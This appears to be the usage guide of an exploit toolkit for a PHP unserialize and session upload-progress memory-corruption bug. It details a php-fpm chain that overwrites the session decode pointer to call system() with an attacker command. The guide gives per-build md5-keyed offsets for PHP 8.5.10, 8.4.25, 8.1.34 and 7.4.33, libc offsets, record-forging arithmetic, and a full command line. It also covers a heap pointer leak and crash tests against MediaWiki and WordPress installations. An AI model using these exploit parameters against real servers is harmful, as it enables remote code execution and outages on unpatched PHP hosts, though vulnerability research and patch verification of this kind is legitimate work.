# USAGE

Install, layout and run one-liners: see `README.md`. This file is the lane matrix, the G2 plan, prerequisites, version matrix and failure diagnosis.

## Lane matrix

| lane | target | producer | consumer | expected receipt | status |
|---|---|---|---|---|---|
| modphp machinery | libphp.so PHP 8.5.10 NTS, httpd prefork | `producer_modphp` filename length N ladder | tiny multipart plus GET arms | HTTP 200, 149 B fatal transcript, worker survives | dry wired, live gated |
| modphp app unserialize | lab unserialize endpoint | `producer_unser` master shape class payload | tiny multipart plus GET arms | HTTP 200, fatal transcript at the class tried alloc, worker survives | dry wired, live gated by `--unser-url` |
| fpm app fatal | php-fpm 8.5.10 static pool | post startup app level fatal inside the unserialize family | none | worker exits 70, no access row | measured, not a route by itself |
| fpm G2 decode hijack | php-fpm 8.5.10, 8.4.25, 8.1.34, 7.4.33 ET_EXEC, ASLR off | `E_USER_ERROR` bailout inside `unserialize` | multipart session record plus forced END decode | marker created, worker survives, decode pointer overwritten | 8.5.10 confirmed lab; other profiles derived, offline `--step g2` |
| modphp in band leak | libphp.so PHP 8.5.10 NTS PIE | M5 plant and trigger | `sidlen` / `sidhex` overread | live session array pointer over HTTP, 4 of 4 runs | measured, `leak_offset` build specific |
| real apps | MediaWiki/Wikibase, WordPress/WooCommerce | anonymous app request | app specific | Wikibase fatal and worker survival, WP 1 of 4 consumers SIGSEGV | reachability and availability, no RCE |

## Prerequisites

| item | value | receipt |
|---|---|---|
| python | 3.10 or newer, stdlib only | `README.md` |
| receipt dir | `files/io/<target>-<step>-<UTC stamp>`, git ignored | `README.md` |
| modphp stack | httpd 2.4.66 plus libphp.so PHP 8.5.10 NTS | `run_20261021T155303Z_armoom` |
| modphp `memory_limit` | 2M `php_value`; absence or 128M means the knob is off and no OOM fires | `run_20261021T155303Z_armoom` phase C |
| `post_max_size` | 8388608 B | `info.php` receipt |
| `upload_max_filesize` | 2M | `info.php` receipt |
| `max_file_uploads` | 20 | `info.php` receipt |
| `session.use_only_cookies` | 1, the sid travels in the Cookie header | `info.php` receipt |
| fpm `fastcgi_request_buffering` | off, so client body pauses reach the pool | blueprint section F.3 |
| fpm `session.upload_progress.min_freq` | 1 s default, the body stall must exceed it | blueprint section F.3 |

## Step map

| step | sends | output |
|---|---|---|
| `recon` | one GET when `--live` is set | fingerprint and addresses |
| `producer` | no, unless `--live` | request bytes and `result.json` |
| `write_stage` | never | final forged multipart bytes |
| `leak` | never | dry modphp calibration plan |
| `g2` | never | `g2-record.bin`, profile, md5 and plan JSON |
| `chain` | modphp sequence dry by default; fpm legacy path is live | per-candidate receipt |

## G2 plan

G2 is the confirmed FPM route on the plain PHP 8.5.10 build, with derived profiles
for 8.4.25, 8.1.34 and 7.4.33. A controlled bailout leaves a stale
`BG(unserialize)` dtor chain. The pre RINIT upload progress session decode reuses
it, and the typed zval write reaches `ps_serializers[2].decode` in `.data`. The
forced END decode then calls the overwritten pointer with the session record bytes
as `rdi`.

Inputs, all explicit:

| flag | meaning | default |
|---|---|---|
| `--g2-profile` | profile version, binary md5 or `.json` path | 8.5.10 |
| `--g2-x` | session record buffer `zend_string` X | required |
| `--g2-p` | stale `php_unserialize_data` P | required |
| `--g2-b0` | stale `var_dtor_entries` B0 | required |
| `--g2-total` | session record length | profile lab geometry, 131014 |
| `--g2-target` | 16 byte aligned write target | `ps_serializers[2].decode` from the selected profile |
| `--g2-value` | serialized long written at the target | `i:1;` |
| `--libc-base` | libc base; `system = base + 0x53090` | none |
| `--command` | shell command, padded to 32 bytes, must end `#` | `id;exit;#` |

Profiles are md5 locked. `PROFILE_MD5` in `tool/modules/g2_chain.py` maps each md5
to one JSON; a version label is only a convenience key. A binary whose md5 is not
in the table has no profile.

| version | md5 | decode target A | PS(serializer) | `zend_eval_string` | ELF | evidence |
|---|---|---|---|---|---|---|
| 8.5.10 | `825470df6b9fa7d0178a1a9bcf4ce6dc` | 0x14c1b60 | 0x14c6160 | 0x9cfd10 | ET_EXEC | live G2, marker created |
| 8.4.25 | `95cca39b95cb5f2d5b897fc5cc6e8628` | 0xe01180 | 0xe03a60 | 0x873790 | ET_EXEC | built non PIE FPM binary, offsets derived, no live run |
| 8.1.34 | `6ea2762ef76f44674805736e19570bb1` | 0xe01140 | 0xe02fb0 | 0x7ec4d5 | ET_EXEC | built non PIE FPM binary, offsets derived, no live run |
| 7.4.33 | `9c7b5c2287fdebe6b3324223034715da` | 0xe010a0 | 0xe02df0 | 0x7cd5ab | ET_EXEC | built non PIE FPM binary offsets, no live G2; write shape reproduced 4/4 |

All four are ET_EXEC non PIE with image base 0x400000. The
`ps_serializers[2].decode` and `PS(serializer)` slots are 16 byte aligned in all
four. Each profile carries libc `system` offset 0x53090 and `popen` 0x7ff90.

Handler choice matters. The lab uses `php_binary`, whose decode slot is
`table + 0x40` and 16 byte aligned. The default `php` serializer decode slot is
`table + 0x28` and is not 16 byte aligned, so the typed write cannot land there.
For the default `php` handler, target `PS(serializer)` at `ps_globals + 0x160`
for 8.4/8.5 or `+0x130` for 8.1/7.4, and write a pointer to a 24 byte fake
`ps_serializer` struct in the record (name at +0, encode at +8, decode at
+0x10). Use `--g2-target <PS(serializer)>` with
`--g2-value 'i:<decimal fake struct address>;'`. The plan emits
`ps_serializer_slot`, and the profile records the fake struct layout. The second
slot writes at `target + 16` and zeroes the type at `target + 24`, so verify the
neighboring `ps_globals` fields before using this route.

`zend_eval_string` and `zend_eval_stringl` are recorded in each profile but are
not decode targets: `zend_eval_string` receives `ZSTR_LEN` as `rsi`, and
`zend_eval_stringl` treats a non NULL `retval_ptr` as a zval and does
`ZVAL_COPY_VALUE`, a wild write for a nonzero length.

`--g2-value` and `--libc-base` are mutually exclusive. The profile binds the
system offset `0x53090` to the lab glibc; the binary imports no `system` symbol,
only `popen`, `execvp`, `fork` and `posix_spawn` PLT entries.

Arithmetic and record shape:

```
used_slots = (target - (B0 + 0x10)) / 16
slot       = B0 + 0x10 + 16 * used_slots
second     = target + 16
type zero  = target + 8 and target + 24
record     = [0x20][32 byte command][i:<n>;] + [0x01]['z']s:<L>:"<payload>";
payload    = fake php_unserialize_data at P - (X + 24)
             fake var_dtor_entries at B0 - (X + 24)
```

The fake P carries `last=P+56`, `first_dtor=last_dtor=B0`, `max_depth=0x7fffffff`
and `entries.used_slots=1018`. The fake B0 carries `used_slots=K` and `next=0`.
The command padding rule is required because the 0x20 key length byte is also
the leading space of the shell command; the trailing `#` comments out the
serialized long that follows.

Example, receipt geometry and libc base:

```sh
python3 -m tool --step g2 \
  --g2-x 0x7ffff7a6a000 --g2-p 0x7ffff7a81000 --g2-b0 0x7ffff7a84000 \
  --g2-total 131014 --command 'touch /tmp/fpmgadget_sys;exit;#' \
  --libc-base 0x7ffff7c9c000 --output files/io/g2-receipt
```

Expected record: 131014 bytes, sha256
`373b4bb1dabda7e4417942ef0b1cd75bbe3880f83b4d1b10187cf66708e075e8`,
`used_slots -8796082913867`, `p_off 94184`, `b_off 106472`, `payload_start 63`,
`L 130949`, `system 0x7ffff7cef090`.

`--g2-profile` selects offsets only. X, P, B0, the libc base and the record
length remain target specific; do not reuse the 8.5.10 receipt geometry on
another build.

Self-checks run before the record is written: 32 byte key, serialized long,
target 16 byte alignment, negative `used_slots`, second slot below B0, fake P
and fake B0 inside the payload, record length convergence. A failed check or a
missing address exits 2 with the reason in `result.json`.

G2 preconditions and limits:

| item | requirement |
|---|---|
| binary | md5 locked profile; ET_EXEC non PIE at image base 0x400000, or a binary base leak |
| profile | select by md5 or version label; a binary md5 mismatch invalidates every offset |
| serializer | `php_binary` decode is 16 byte aligned; the default `php` handler uses the `PS(serializer)` slot plus a fake 24 byte struct |
| libc | base for `system`, or a fixed target that accepts `(char *, size_t)`; the fixed target route is not demonstrated |
| heap | X, P, B0 and the exact record length |
| FPM setup | upload progress on with the forced END update in the same request |
| ordering | the plant request must be the immediately preceding request on the same worker |
| retries | single shot per plant; the corrupt decode pointer persists until worker restart |
| ASLR | off in the lab; the ASLR capable heap leak is open (F14) |

Confirmed on 8.5.10 in two plant runs (n=7, n=11), same worker, marker created.
The 8.4.25, 8.1.34 and 7.4.33 profiles are derived from built non PIE FPM
binaries and were not run live. A wrong X either leaves the plant chain in place
or crashes `var_push`; a wrong record length can crash the second decode. No
claim is made for other session savers, opcache, ZTS or shared pools. 5.x cannot
reuse this geometry: `php_unserialize_data` has a different field order,
`used_slots` is at `+0x2000`, `next` at `+0x2008`, the bound is equality, and
`BG(unserialize)` is a struct.

## modphp machinery lane

| N filename bytes | request body bytes | expected alloc bytes | expected HTTP | transcript | worker | receipt |
|---|---|---|---|---|---|---|
| 262144 | 4983500 | 266240 | 200 | 149 B fatal | survives | `run_20261021T155303Z_armoom` |
| 330000 | 6272764 | 331776 | 200 | 149 B fatal | survives | `run_20261021T155303Z_armoom` |
| 400000 | 7602764 | 401408 | 200 | 149 B fatal | survives | `run_20261021T155303Z_armoom` |
| any | 20 file parts | alloc rule `((N // 4096) + 1) * 4096` | 200 | 149 B fatal | 11 of 11 survive | `run_20261021T155303Z_armoom` |

## modphp app unserialize lane

| class | memory_limit bytes | H | P | P_max | payload bytes | tried alloc bytes | stock post cap | transport |
|---|---|---|---|---|---|---|---|---|
| 2M | 2097152 | 32769 | 10000 | 10748 | 342176 | 2621440 | 342176 below 8388608 | allowed |
| 8M | 8388608 | 131073 | 60000 | 65535 | 1528609 | 10485760 | 1528609 below 8388608 | allowed |
| 128M | 134217728 | 2097153 | 4000000 | 4194303 | 48777252 | 167772160 | 48777252 above 8388608 | refused pre connect, exit 2 |

## FPM lane prerequisites

| prerequisite | value | evidence |
|---|---|---|
| request startup | `php_request_startup()` must succeed; a machinery OOM before startup is lethal | `run_exit70` section 1 |
| exit 70 | `FPM_EXIT_SOFTWARE`, an uncaught `zend_bailout`; no access row | 12 machinery OOMs, 12 exit 70 in `run_exit70` |
| producer position | post startup fatal inside the unserialize family (`session_start`, `session_decode`, `unserialize`, WP `maybe_unserialize`) | blueprint section F.2 |
| app level control | EditPage OOM at 8000032 tried bytes never caused exit 70; the worker served arms 15 s later | `run_exit70` harvest G |
| consumer arm | small arm only, 4 filenames of 4096 bytes, machinery fits the 8M pool | `run_smallarm` |
| body stall | `fastcgi_request_buffering off`, pause above `session.upload_progress.min_freq` 1 s | blueprint section F.3 |
| wp producer data | attacker controlled serialized string persisted on the server (user meta, transients) | blueprint section F.2 |

## Version matrix

| branch | audited vulnerable | first fixed | note |
|---|---|---|---|
| 8.5 | 8.5.10 (live), 8.5.11 (source) | 8.5.12 | `php_basic_early_rinit` resets `BG(unserialize)` before `sapi_activate` |
| 8.4 | 8.4.25 (source) | 8.4.27 | 8.4.26 is structurally identical to 8.4.25 |
| 8.3 | 8.3.27 (source) | 8.3.36 | same early reset |
| 8.2 | 8.2.29 (source) | 8.2.35 | same early reset |
| 8.1, 8.0, 7.x, 5.x | EOL, unpatched | none | 7.4.33 write reproduced 4/4; 5.x G2 geometry differs |

G2 offsets by build, keyed by binary md5, not by version:

| version | md5 | decode target A | PS(serializer) | `zend_eval_string` | ELF | evidence |
|---|---|---|---|---|---|---|
| 8.5.10 | `825470df6b9fa7d0178a1a9bcf4ce6dc` | 0x14c1b60 | 0x14c6160 | 0x9cfd10 | ET_EXEC | live G2, marker created |
| 8.4.25 | `95cca39b95cb5f2d5b897fc5cc6e8628` | 0xe01180 | 0xe03a60 | 0x873790 | ET_EXEC | built non PIE FPM binary, offsets derived, no live run |
| 8.1.34 | `6ea2762ef76f44674805736e19570bb1` | 0xe01140 | 0xe02fb0 | 0x7ec4d5 | ET_EXEC | built non PIE FPM binary, offsets derived, no live run |
| 7.4.33 | `9c7b5c2287fdebe6b3324223034715da` | 0xe010a0 | 0xe02df0 | 0x7cd5ab | ET_EXEC | built non PIE FPM binary offsets, no live G2; write shape reproduced 4/4 |

The fix does not remove the write primitive; it removes the stale global that
lets the attacker choose P and B0. `ps_serializers` and `ps_globals` are build
specific, so key on md5 or build id. The default `php` handler decode slot is not
16 byte aligned; use the `PS(serializer)` slot and a fake 24 byte
`ps_serializer` struct. 5.x cannot reuse this geometry: `php_unserialize_data`
is `{first, last, first_dtor, last_dtor}`, dtor entries use `zval *data[1024]`
with `used_slots` at `+0x2000` and `next` at `+0x2008`, the bound is equality, and
`BG(unserialize)` is a struct not a pointer.

## Real targets

| app | request | result |
|---|---|---|
| MediaWiki 1.46.2 + Wikibase REL1_46 | anonymous `action=parse`, `contentmodel=wikibase-item`, `contentformat=application/vnd.php.serialized` | 52,065 B blob exhausts 1 GiB inside `php_var_unserialize_internal` at depth 1,533; HTTP 500; the FPM child survives and serves the next request on the same PID; `BG(unserialize).level=1` and the dtor chain survive into the next request |
| WordPress 7.1.3 + WooCommerce 11.2.1 | guest classic checkout, 12 address fields, 84 MiB synthetic pressure, WCS sink replica | producer OOM inside `unserialize`; the next multipart consumer writes into the stale dtor block; 1 of 4 consumers died with SIGSEGV (502), 3 of 4 returned 200; the sink is a labeled replica because paid WCS 9.0.0 was not on disk; no RCE claimed |

## Fingerprint and profile pack

| item | behavior | numbers |
|---|---|---|
| `--step recon` | GET the path, record status, server, connection, content type and body bytes | exit 0 alive, exit 2 not alive |
| disclosure gate | 14 B frozen profile disclosure at LEAK_OFFSET inside a main chunk | LEAK_OFFSET 0x57030, main chunk 0x200000 |
| `--step leak` | dry calibration plan, request shapes plus algorithm, no transport | 10 exchanges per stage, 3 stable triples, 4096 B Set-Cookie cap, approx 98 encoded pointers |
| `leak_offset` | decoded session array minus Zend chunk base, measured on libphp md5 `92f76e84a77bf8b56c45c3868fa29a6c` | 0x2188 = heap + 0x2148, heap = chunk + 0x40; 4 of 4 runs, ASLR on; build and mapping specific, not a universal constant |
| leak binding scope | the channel is the in-band `sidlen` / `sidhex` overread, not the Set-Cookie PS(id) channel | the Set-Cookie PS(id) offset is not separately measured; `target_offset` remains `TBD_from_leak_chunk_anchor` |
| address profile | `addresses/apache_libphp.json`, per binary offsets and lane | 40492240 B, md5 `92f76e84a77bf8b56c45c3868fa29a6c`, p_align 0x1000 |
| five resolved symbols | `zif_system` 0x40cc80, `zif_passthru` 0x40cc90, `zend_call_function` 0x540500, `zend_llist_remove_tail` 0x5d39a0, `zval_ptr_dtor` 0x5f0980 | deltas 0xb0480 and 0x1c6d10 |
| engine symbols | `php_url_encode` 0x460d70, `ps_globals` 0xa3b020, `basic_globals` 0xa3bdc0, `php_apache_sapi_ub_write` 0x5f7ee0, `zend_rc_dtor_func` 0x96f760 | PS(id) offset 16, PS(http_session_vars) offset 360 |
| G2 profiles | `addresses/g2_fpm_8510.json`, `g2_fpm_8425.json`, `g2_fpm_8134.json`, `g2_fpm_7433.json` | 8.5.10 table 0x14c1b20, decode 0x14c1b60; 8.4.25 0xe01180; 8.1.34 0xe01140; 7.4.33 0xe010a0; all md5 locked, libc system 0x53090 |
| profile pack build | `universal/profile_builder.py` reads `nm` and `readelf` and writes `addresses/*.json` | new target needs `profiles.py` TARGETS plus BINARY_PROFILES |

## Failure diagnosis

| symptom | cause | check | action |
|---|---|---|---|
| no machinery fatal, benign body | uploads disabled, `session.upload_progress.enabled=0` | phpinfo or pool conf | enable upload progress and retry |
| request rejected before machinery | body at or above `post_max_size` 8388608 B | compare request bytes with 8388608 | use the 2M or 8M class, exit 2 |
| `NotImplementedError` on a memory limit | no receipted class; only 2M, 8M, 128M ship | `producer_unser.class_record` message | measure a new class first, exit 2 |
| modphp assumptions fail on FPM | SAPI mismatch; machinery OOM kills the FPM worker with exit 70 | phpinfo Server API | use the fpm app level producer plus the small arm |
| arm returns `0` with no OOM | modphp `memory_limit` knob absent or 128M build default | phpinfo `memory_limit` | set the knob, the producer refuses pre flight |
| same sid requests time out | session file flock queue | session save path lock holders | use a fresh sid except in the deliberate stale stage |
| g2 exits 2, missing address | X, P or B0 not supplied | `result.json` error lists the missing flag | pass all three; the plan never guesses |
| g2 exits 2, unknown profile | version label, md5 or path not in the registry | `result.json` error lists valid labels | use a profile version, md5, or `.json` path |
| g2 exits 2, no transport | `--live` passed to an offline step | `result.json` says no transport | drop `--live` |
| g2 default php handler | php decode slot is not 16 byte aligned; a target at `table + 0x28` fails | `result.json` target and `ps_serializer_slot` | target `PS(serializer)` and write a fake struct pointer |
| g2 command error | command does not end `#` or is longer than 32 bytes | `result.json` error | trim and end with `#` |
| g2 target error | target not 16 byte aligned, or not reachable from B0 | `result.json` error | use an aligned target below B0 + 0x10 |
| g2 P or B0 outside payload | wrong X or total | check `p_off`, `b_off`, `payload_start` in `result.json` | re-measure X or the record length |
| g2 record checks fail | second slot above B0 or length does not converge | `result.json` checks | re-check the direction and total |
| g2 wrong build | offsets are build specific | compare md5 or build id with the profile | re-derive the profile, do not reuse offsets |
